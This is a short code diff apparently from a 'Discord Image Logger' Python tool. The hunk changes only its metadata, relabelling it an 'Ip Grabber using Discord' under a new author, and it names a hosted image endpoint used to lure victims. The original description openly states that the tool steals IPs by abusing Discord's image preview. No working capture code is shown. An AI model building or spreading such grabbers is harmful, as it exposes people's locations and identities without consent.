@@ -5,9 +5,9 @@ import traceback, requests, base64, httpagentparser
 #Website is https://tenor-three-pied.vercel.app/api/image
 
 __app__ = "Discord Image Logger"
-__description__ = "A simple application which allows you to steal IPs and more by abusing Discord's Open Original feature"
-__version__ = "v2.0"
-__author__ = "DeKrypt"
+__description__ = "Ip Grabber using Discord"
+__version__ = "v1.0"
+__author__ = "y-o1"
 
 config = {
     # BASE CONFIG #
